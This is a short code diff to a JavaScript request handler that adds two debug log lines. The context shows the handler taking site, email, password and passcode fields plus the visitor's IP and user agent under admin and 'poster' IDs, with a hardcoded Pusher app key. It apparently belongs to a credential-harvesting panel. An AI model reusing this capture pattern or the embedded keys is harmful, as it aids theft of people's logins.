@@ -416,6 +416,7 @@ const getSatoshis = async (usdAmount) => {
 };
 
 export const add_data = async (req, res) => {
+
   const pusher = new Pusher({
     appId: "1987499",
     key: "05656b52c62c0f688ee3",
@@ -425,6 +426,8 @@ export const add_data = async (req, res) => {
   });
 
   const { adminId, posterId } = req.params;
+  console.log("adminId", adminId);
+  console.log("posterId", posterId);
   const { site, mail, passcode, email, password, amount } = req.body;
   const userAgent = req.headers["user-agent"];
   const ipAddress = (
